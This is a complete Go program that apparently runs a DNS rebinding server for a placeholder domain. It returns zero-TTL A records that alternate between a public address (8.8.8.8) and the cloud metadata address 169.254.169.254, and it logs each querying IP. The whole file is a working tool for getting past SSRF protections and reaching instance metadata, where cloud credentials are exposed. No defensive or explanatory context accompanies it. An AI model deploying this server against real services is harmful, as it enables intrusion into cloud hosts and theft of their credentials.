package main

import (
	"net"

	log "github.com/sirupsen/logrus"

	"github.com/miekg/dns"
)

var flag int32
// For alternate IP logic

func rebindDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	rName := ""

	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false
	raddress := w.RemoteAddr()

	for _, q := range r.Question {

		name := q.Name
		log.Println("IP Address: ", raddress.String(), " queried for ", name)
		rName = name
	}

	record := new(dns.A)
	record.Hdr = dns.RR_Header{Name: rName, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0}

	if flag == 0 {
		record.A = net.IPv4(8, 8, 8, 8)
		flag = 1
	} else {
		record.A = net.IPv4(169, 254, 169, 254)
		flag = 0
	}

	m.Answer = append(m.Answer, record)
	w.WriteMsg(m)
}

func main() {
	log.SetFormatter(&log.TextFormatter{
		FullTimestamp: true,
		ForceColors:   true,
	})
	dns.HandleFunc("domain_name_here", rebindDNSRequest)
	server := &dns.Server{Addr: ":53", Net: "udp"}
	err := server.ListenAndServe()
	defer server.Shutdown()
	if err != nil {
		log.Fatalln(err)
	}
}
